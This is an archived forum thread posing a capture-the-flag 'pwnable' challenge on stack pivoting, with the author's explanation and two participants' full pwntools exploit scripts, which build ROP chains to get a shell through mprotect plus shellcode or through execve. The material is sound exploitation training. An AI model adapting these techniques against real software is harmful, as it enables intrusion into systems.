<!DOCTYPE html>
<html lang="en">
  <!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
    <meta charset="utf-8">
    <title>[Pwnable] Stacky Jumpy - Exploit Development - 0x00sec - The Home of the Hacker</title>
    <meta name="description" content="That‚Äôs what you get for making a binary so user-dependent. 

###Diffuclty 
4/10 

###Objective 
Get a shell. 

###Rules 


ASLR on. 


No libc this time, it‚Äôs statically linked, thus its size. 


Full exploit + demo (i.e&amp;hellip;">
    <meta name="generator" content="Discourse 3.6.0.beta2-latest - https://github.com/discourse/discourse version 3b1964f3ed8bdc2f181e2abccb1b116e4b814db5">
<link rel="icon" type="image/png" href="../../uploads/default/optimized/2X/3/30c4e7d76acf879a124fdfe4d8d126afe628c189_2_32x32.html">
<link rel="apple-touch-icon" type="image/png" href="../../uploads/default/optimized/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e_2_180x180.html">
<meta name="theme-color" media="all" content="#171616">

<meta name="color-scheme" content="dark">

<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, viewport-fit=cover">
<link rel="canonical" href="3302.html" />

<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch.xml" title="0x00sec - The Home of the Hacker Search">

    
    <link href="../../stylesheets/color_definitions_0x00sec-v2_15_57_dfa17f5b2e0faf8b274cd749dd7dab92384218d4.css_%3b%20filename_%3dUTF-8%27%27color_definitions_0x00sec-v2_15_57_dfa17f5b2e0faf8b274cd749dd7dab92384218d4a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" class="light-scheme" data-scheme-id="15"/>

<link href="../../stylesheets/common_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27common_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="common"  />

  <link href="../../stylesheets/mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="mobile"  />
  <link href="../../stylesheets/desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="desktop"  />



    <link href="../../stylesheets/chat_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="chat"  />
    <link href="../../stylesheets/checklist_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27checklist_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="checklist"  />
    <link href="../../stylesheets/discourse-cakeday_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-cakeday_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-cakeday"  />
    <link href="../../stylesheets/discourse-details_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-details_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-details"  />
    <link href="../../stylesheets/discourse-lazy-videos_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-lazy-videos_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-lazy-videos"  />
    <link href="../../stylesheets/discourse-local-dates_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-local-dates_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-local-dates"  />
    <link href="../../stylesheets/discourse-narrative-bot_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-narrative-bot_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-narrative-bot"  />
    <link href="../../stylesheets/discourse-presence_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-presence_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-presence"  />
    <link href="../../stylesheets/discourse-solved_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-solved_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-solved"  />
    <link href="../../stylesheets/discourse-templates_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-templates_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-templates"  />
    <link href="../../stylesheets/discourse-topic-voting_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-topic-voting"  />
    <link href="../../stylesheets/docker_manager_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27docker_manager_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="docker_manager"  />
    <link href="../../stylesheets/footnote_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27footnote_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="footnote"  />
    <link href="../../stylesheets/poll_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27poll_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="poll"  />
    <link href="../../stylesheets/spoiler-alert_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27spoiler-alert_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="spoiler-alert"  />
    <link href="../../stylesheets/chat_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="chat_mobile"  />
    <link href="../../stylesheets/discourse-solved_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-solved_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="discourse-solved_mobile"  />
    <link href="../../stylesheets/discourse-topic-voting_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="discourse-topic-voting_mobile"  />
    <link href="../../stylesheets/chat_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="chat_desktop"  />
    <link href="../../stylesheets/discourse-topic-voting_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="discourse-topic-voting_desktop"  />
    <link href="../../stylesheets/poll_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27poll_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="poll_desktop"  />

  <link href="../../stylesheets/common_theme_57_2b2f1b92f8727e7da2866f327e36ad944c6960db.css_%3b%20filename_%3dUTF-8%27%27common_theme_57_2b2f1b92f8727e7da2866f327e36ad944c6960dba97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="common_theme" data-theme-id="57" data-theme-name="0x00sec-v2"/>
    <link href="../../stylesheets/mobile_theme_4_7b59060f894813801912cfad9deff99ebb9e9a38.css_%3b%20filename_%3dUTF-8%27%27mobile_theme_4_7b59060f894813801912cfad9deff99ebb9e9a38a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="mobile_theme" data-theme-id="4" data-theme-name="mobile chrome"/>
    <link href="../../stylesheets/desktop_theme_46_ae6f300d6e65399f845f6707524095726ad69a96.css_%3b%20filename_%3dUTF-8%27%27desktop_theme_46_ae6f300d6e65399f845f6707524095726ad69a96a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="desktop_theme" data-theme-id="46" data-theme-name="header links v2"/>

    <link rel="stylesheet" href="../../../external.html?link=https://s3.amazonaws.com/0x00sec/monokai-sublime.css">
<script src="../../../external.html?link=https://s3.amazonaws.com/0x00sec/highlight.pack.js" nonce="eR2Zay0gfuod1MAuyeH3sBXy3"></script>
<script defer="" src="../../theme-javascripts/05954ff525aceb8daa8b585f92d758d311ae7077.js_%3b%20filename_%3dUTF-8%27%2705954ff525aceb8daa8b585f92d758d311ae7077a97f.js?__ws=d.clarkee.co.uk" data-theme-id="40" nonce="eR2Zay0gfuod1MAuyeH3sBXy3"></script>
    
        <link rel="alternate nofollow" type="application/rss+xml" title="RSS feed of &#39;[Pwnable] Stacky Jumpy&#39;" href="3302.rss" />
    <meta property="og:site_name" content="0x00sec - The Home of the Hacker" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://d.clarkee.co.uk/uploads/default/original/2X/2/27a5373af868edade07624e8205c46e79c247445.jpeg" />
<meta property="og:image" content="https://d.clarkee.co.uk/uploads/default/original/2X/2/27a5373af868edade07624e8205c46e79c247445.jpeg" />
<meta property="og:url" content="https://d.clarkee.co.uk/t/pwnable-stacky-jumpy/3302" />
<meta name="twitter:url" content="https://d.clarkee.co.uk/t/pwnable-stacky-jumpy/3302" />
<meta property="og:title" content="[Pwnable] Stacky Jumpy" />
<meta name="twitter:title" content="[Pwnable] Stacky Jumpy" />
<meta property="og:description" content="That‚Äôs what you get for making a binary so user-dependent.   ###Diffuclty  4/10   ###Objective  Get a shell.   ###Rules    ASLR on.    No libc this time, it‚Äôs statically linked, thus its size.    Full exploit + demo (i.e asciinema) are accepted as valid solutions. Just a screenshot of the shell doesn‚Äôt mean anything.    It‚Äôs pretty likely you might come up with a different exploit variation than mine, but the trick should be the same.     ###Hint(s)    ###Binary  Pwn me if you can   ~ gl &amp; hf  #..." />
<meta name="twitter:description" content="That‚Äôs what you get for making a binary so user-dependent.   ###Diffuclty  4/10   ###Objective  Get a shell.   ###Rules    ASLR on.    No libc this time, it‚Äôs statically linked, thus its size.    Full exploit + demo (i.e asciinema) are accepted as valid solutions. Just a screenshot of the shell doesn‚Äôt mean anything.    It‚Äôs pretty likely you might come up with a different exploit variation than mine, but the trick should be the same.     ###Hint(s)    ###Binary  Pwn me if you can   ~ gl &amp; hf  #..." />
<meta property="og:article:section" content="Exploit Development" />
<meta property="og:article:section:color" content="92278F" />
<meta property="og:article:tag" content="exploitation" />
<meta property="og:article:tag" content="binary" />
<meta property="og:article:tag" content="pwning" />
<meta property="og:article:tag" content="linux" />
<meta name="twitter:label1" value="Reading time" />
<meta name="twitter:data1" value="5 mins üïë" />
<meta name="twitter:label2" value="Likes" />
<meta name="twitter:data2" value="26 ‚ù§" />
<meta property="article:published_time" content="2017-08-13T11:21:21+00:00" />
<meta property="og:ignore_canonical" content="true" />


    
  </head>
  <body class="crawler ">
    <div id="top-navbar" class="container">
<span id="top-navbar-links" style="display:none;">
  <!--<a href="https://git.0x00sec.org" class="dow-menu">GitLab</a>  
  <a href="https://blog.0x00sec.org/irc" class="dow-menu">IRC</a>!-->
  <a href="../../../external.html?link=https://init.0x00sec.org/" class="dow-menu">Init</a>
  <a href="../../../external.html?link=https://discord.gg/c6BHVfn" class="dow-menu">Discord</a>
  <a href="../../../external.html?link=https://init.0x00sec.org/?partners" class="dow-menu">Partners</a>
</span>
</div>
    <header>
  <a href="../../index.html">0x00sec - The Home of the Hacker</a>
</header>

    <div id="main-outlet" class="wrap" role="main">
        <div id="topic-title">
    <h1>
      <a href="3302.html">[Pwnable] Stacky Jumpy</a>
    </h1>

      <div class="topic-category" itemscope itemtype="../../../external.html?link=http://schema.org/BreadcrumbList">
          <span itemprop="itemListElement" itemscope itemtype="../../../external.html?link=http://schema.org/ListItem">
            <a href="../../c/exploit-development/53.html" class="badge-wrapper bullet" itemprop="item">
              <span class='badge-category-bg' style='background-color: #92278F'></span>
              <span class='badge-category clear-badge'>
                <span class='category-name' itemprop='name'>Exploit Development</span>
              </span>
            </a>
            <meta itemprop="position" content="1" />
          </span>
      </div>

      <div class="topic-category">
        <div class='discourse-tags list-tags'>
            <a href='../../tag/exploitation.html' class='discourse-tag' rel="tag">exploitation</a>, 
            <a href='../../tag/binary.html' class='discourse-tag' rel="tag">binary</a>, 
            <a href='../../tag/pwning.html' class='discourse-tag' rel="tag">pwning</a>, 
            <a href='../../tag/linux.html' class='discourse-tag' rel="tag">linux</a>
        </div>
      </div>
  </div>

  

    <div itemscope itemtype='../../../external.html?link=http://schema.org/DiscussionForumPosting'>
      <meta itemprop='headline' content='[Pwnable] Stacky Jumpy'>
      <link itemprop='url' href='3302.html'>
      <meta itemprop='datePublished' content='2017-08-13T11:21:21Z'>
        <meta itemprop='articleSection' content='Exploit Development'>
      <meta itemprop='keywords' content='exploitation, binary, pwning, linux'>
      <div itemprop='publisher' itemscope itemtype="../../../external.html?link=http://schema.org/Organization">
        <meta itemprop='name' content='0x00sec - The Home of the Hacker'>
          <div itemprop='logo' itemscope itemtype="../../../external.html?link=http://schema.org/ImageObject">
            <meta itemprop='url' content='../../uploads/default/original/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e.html'>
          </div>
      </div>


          <div id='post_1'  class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/_py.html'><span itemprop='name'>_py</span></a>
                
              </span>

                <link itemprop="mainEntityOfPage" href="3302.html">


              <span class="crawler-post-infos">
                  <time  datetime='2017-08-13T11:21:21Z' class='post-time'>
                    August 13, 2017, 11:21am
                  </time>
                  <meta itemprop='dateModified' content='2017-08-15T16:20:25Z'>
              <span itemprop='position'>1</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>That‚Äôs what you get for making a binary so user-dependent.</p>
<hr>
<p>###<em>Diffuclty</em></p>
<p>4/10</p>
<hr>
<p>###<em>Objective</em></p>
<p>Get a shell.</p>
<hr>
<p>###<em>Rules</em></p>
<ul>
<li>
<p>ASLR on.</p>
</li>
<li>
<p>No libc this time, it‚Äôs statically linked, thus its size.</p>
</li>
<li>
<p>Full exploit + demo (i.e asciinema) are accepted as valid solutions. Just a screenshot of the shell doesn‚Äôt mean anything.</p>
</li>
<li>
<p>It‚Äôs pretty likely you might come up with a different exploit variation than mine, but the <em>trick</em> should be the same.</p>
</li>
</ul>
<hr>
<p>###<em>Hint(s)</em></p>
<div class="spoiler">
<p> Stack Pivot </p>
</div>
<hr>
<p>###<em>Binary</em></p>
<p><a href="../../../external.html?link=https://transfer.sh/13reaE/jumpy" rel="nofollow noopener">Pwn me if you can</a></p>
<hr>
<p>~ gl &amp; hf</p>
<p>###<em>Solution Explanation</em></p>
<div class="spoiler">
<p>The purpose of the challenge was to teach you the concept of stack pivoting. Unfortunately no one (so far) solved it the intended way, so they practically learnt nothing new. As for my PoC now (which was the intended way):</p>
<p>The binary has an out-of-bound read (both positive and negative indices) and a partial out-of-bound-write (negative indices). At offset -9 from the integer array (meaning - 9*4 bytes since we are on a 32-bit arch) is the return address of any function you call inside main(). What do I mean by that? Let‚Äôs say store() is being called.</p>
<pre><code class="lang-makefile">                           Stack
                     +----------------+
 Stack grows         |       ...      |  &lt;--- main's frame
 towards low         |   uint* array  |
 addresses           +----------------+
                     |       ...      |  &lt;---- store's frame
                     +----------------+
</code></pre>
<p>Store() receives a <strong>stack pointer</strong> as an argument, the integer array to be precise. It‚Äôs really important to note the stack pointer part. Why? Well, since we have an OOB read and a partial OOB write, we can affect stack values below and above the integer array. And as we all know, what‚Äôs definitely stored on the stack? The return address!</p>
<p>The way to find the exact offset where the return address of store() is can be done either by trial and error (kinda skid-ish) or by looking at the assembly.</p>
<p>Main:</p>
<pre><code class="lang-auto">0804904b  lea     eax, [esp+0x20] /* uint array[] */
0804904f  mov     dword [esp], eax
08049052  call    store_value
</code></pre>
<p>So the array is at offset +0x20 (32 in decimal) from the stack pointer. Here‚Äôs the stack view right when store() is called:</p>
<pre><code class="lang-makefile">                     +--------------+
                     |      ...     |
   esp + 0x20 ---&gt;   |  uint* array |  
                     |      ...     |
                     +--------------+  
     old  esp ---&gt;   |  uint* array |   &lt;--- mov dword [esp], eax
                     +--------------+
                     |   ret addr   |   &lt;--- call store_value
     new  esp ---&gt;   +--------------+


</code></pre>
<p>I think it‚Äôs crystal clear now as to what‚Äôs going on with the stack and why at offset -36 you can overwrite the return address.</p>
<p>As for the stack pivot trick now, I overwrote the return address with the gadget <strong>add esp, 0x2c</strong> (could have used a different gadget for pivot ofc) which means the stack pointer will point 0x2c (44 decimal) above (higher address) from where it was pointing to.</p>
<p>Keep in mind, once store() is about to return, esp is pointing to where <em>old esp</em> was pointing to on the above ascii-art. Which means, the array buffer and esp will have 0x20 bytes difference. In other words, at offset <strong>esp + 0x20</strong> we can reach the <strong>1st</strong> array value (0th index). But, since we are adding 0x2c to esp (0x20 + 12) we can reach the <strong>4th</strong> array value (3rd index). That‚Äôs why I stored the gadgets from the 3rd index and up.</p>
<p>I hope it makes more sense now.</p>
</div>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="6" />
              <span class='post-likes'>6 Likes</span>
            </div>


            
          </div>
          <div id='post_2' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/exploit.html'><span itemprop='name'>exploit</span></a>
                (exploit)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-08-13T16:06:02Z' class='post-time'>
                    August 13, 2017,  4:06pm
                  </time>
                  <meta itemprop='dateModified' content='2017-08-13T16:06:02Z'>
              <span itemprop='position'>2</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <ul>
<li>I‚Äôll check it out a bit <img src="../../../0x00sec.org/images/emoji/twitter/smilec164.html?v=9" title=":smile:" class="emoji" alt=":smile:">
</li>
</ul>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_3' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/mkhdznfq.html'><span itemprop='name'>mkhdznfq</span></a>
                
              </span>


                <link itemprop="image" href="../../../0x00sec.s3.amazonaws.com/original/2X/a/aeeb52dbd776afe553ff27ccf042209ddc4166d3.png">

              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-08-13T16:35:20Z' class='post-time'>
                    August 13, 2017,  4:35pm
                  </time>
                  <meta itemprop='dateModified' content='2017-08-14T07:14:19Z'>
              <span itemprop='position'>3</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>great challenge again. i managed to get shell but somehow my solution aren‚Äôt always reliable. sometimes it will SIGSEGV. perhaps someone could give me some pointers <img src="../../../0x00sec.org/images/emoji/twitter/sweat_smilec164.html?v=9" title=":sweat_smile:" class="emoji" alt=":sweat_smile:"> anyway here‚Äôs my poc</p>
<div class="spoiler">
<p>EDIT: the poc has been updated to a more reliable version. the culprit of the segmentation fault is because the shellcode does not fall on the executable address range. this can be solve by explicitly calling mprotect to cover the array stack address</p>
<pre><code class="lang-python">from pwn import *
context(arch='i386', os='linux')

# open the process
r = process("./jumpy")

# bypass junk
r.recvuntil("Enter your name: ")
r.sendline("JUNK")

# get array address
r.recvuntil("&gt; ")
r.sendline("1")
r.recvuntil("Index: ")
r.sendline("-8")
arr = int(r.recvline()[12:22], 16)

# generate rop chain
rop_chain = [
	0x0806f0b1, 		# pop ecx; pop ebx; ret;
	0, 					# skip
	0, 					# skip
	0x0806e0d0, 		# mprotect
	0x080483ab, 		# pop ebx; pop esi; pop edi; pop ebp; ret; 
	arr &amp; 0xfffff000, 	# array address aligned to page size
	0x00001500, 		# len = 0x1500
	7, 					# prot = PROT_EXEC
	0, 					# skip
	0x080e2d13  		# jmp esp;
	]

# create shellcode &amp; append to rop chain
sc = asm(shellcraft.i386.linux.sh())
sc_chunk = map(lambda x: unpack(''.join(x)), zip(*[iter(sc)]*4))
rop_chain = rop_chain + sc_chunk

# put rop chain on the stack
index = len(rop_chain) - 10
for n in rop_chain[::-1]:
	r.recvuntil("&gt; ")
	r.sendline("2")
	r.recvuntil("Index: ")
	r.sendline(str(index))
	r.recvuntil("Value: ")
	r.sendline(str(n))
	print "Array[{}] = {}".format(index, n)
	index = index - 1

# shell time!
r.interactive()
</code></pre>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/a/aeeb52dbd776afe553ff27ccf042209ddc4166d3.png" width="690" height="430"></p>
</div>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="2" />
              <span class='post-likes'>2 Likes</span>
            </div>


            
          </div>
          <div id='post_4' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/_py.html'><span itemprop='name'>_py</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-08-13T16:46:01Z' class='post-time'>
                    August 13, 2017,  4:46pm
                  </time>
                  <meta itemprop='dateModified' content='2017-08-13T17:42:36Z'>
              <span itemprop='position'>4</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>The exploit is a bit rusty/lucky, try making it more hybrid/reliable. This pwnable teaches a new concept.</p>
<p>Here are some pointers:</p>
<div class="spoiler">
<p>You don‚Äôt need a shellcode. It could be done way simpler. You found the trick, being index -9. Use that to call execve. Google ‚Äústack pivoting‚Äù <img src="../../../0x00sec.org/images/emoji/twitter/winkc164.html?v=9" title=":wink:" class="emoji" alt=":wink:"> </p>
</div>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_5' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/exploit.html'><span itemprop='name'>exploit</span></a>
                (exploit)
              </span>


                <link itemprop="image" href="../../../0x00sec.s3.amazonaws.com/original/2X/4/403fe18a353839562f0e4682a88c09e8f94a14e7.png">

              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-08-13T19:47:32Z' class='post-time'>
                    August 13, 2017,  7:47pm
                  </time>
                  <meta itemprop='dateModified' content='2017-08-13T19:47:32Z'>
              <span itemprop='position'>5</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <ul>
<li>The way i did it is more complicated but guaranteed‚Ä¶ <img src="../../../0x00sec.org/images/emoji/twitter/confusedc164.html?v=9" title=":confused:" class="emoji" alt=":confused:">
</li>
<li>I also did it in another classic way, which is passing the register values to a pointer and incrementing‚Ä¶ But i prefered this one, cause it‚Äôs more creative <img src="../../../0x00sec.org/images/emoji/twitter/slight_smilec164.html?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:">
</li>
</ul>
<p>I‚Äôll share it then:</p>
<div class="spoiler">
<pre><code class="lang-python">#!/usr/bin/python
from pwn import *

c = process("./jumpy")

saved_rip_offset = -9
pop_eax = 0x080bb626
pop_pop_ret = 0x0804848e
pop_edx = 0x0806f08a
add_eax_edx = 0x080697d3
xchg_eax_edx = 0x080a9264
mov_ebx_edx = 0x0806d78b
int_0x80 = 0x0806f750
mov_ecx_eax = 0x080b54ff
mov_eax_edx = 0x08065f44
chain = [pop_pop_ret,
	 0,
	 0,
	 mov_eax_edx,
	 pop_edx,
	 0x426,
	 add_eax_edx,
	 pop_pop_ret,
	 0,
	 0,
	 xchg_eax_edx,
	 mov_ebx_edx,
	 pop_eax,
	 0,
	 mov_ecx_eax,
	 pop_eax,
	 11,
	 pop_edx,
	 0,
	 int_0x80]
to_start = saved_rip_offset + (len(chain) - 1)

c.sendline("/bin/dash") # Name is going to be passed to execve() as the first argument later

for gadget in chain[::-1]:
	c.sendline("2")
	c.recvuntil(":")
	c.sendline(str(to_start))
	c.recvuntil(":")
	c.sendline(str(gadget))
	to_start -= 1

c.recv()
log.success("Enjoy your shell :)!")

c.interactive()
</code></pre>
<ul>
<li>
</li></ul>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/4/403fe18a353839562f0e4682a88c09e8f94a14e7.png" width="440" height="133"></p>
</div>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="2" />
              <span class='post-likes'>2 Likes</span>
            </div>


            
          </div>
          <div id='post_6' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/Retr1.html'><span itemprop='name'>Retr1</span></a>
                (The memelord of 0x00sec)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-08-13T19:55:39Z' class='post-time'>
                    August 13, 2017,  7:55pm
                  </time>
                  <meta itemprop='dateModified' content='2017-08-13T19:55:39Z'>
              <span itemprop='position'>6</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>I don‚Äôt want to be that guy that asks where you learned all this, but I‚Äôm gonna do it anyway because i am that guy who asks you where you learned all this‚Ä¶ So where do I start with this? Obviously learn assembly, but after that?</p>
<p>Sorry to be a bother <img src="../../../0x00sec.org/images/emoji/twitter/winkc164.html?v=9" title=":wink:" class="emoji" alt=":wink:"></p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="2" />
              <span class='post-likes'>2 Likes</span>
            </div>


            
          </div>
          <div id='post_7' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/exploit.html'><span itemprop='name'>exploit</span></a>
                (exploit)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-08-13T20:02:18Z' class='post-time'>
                    August 13, 2017,  8:02pm
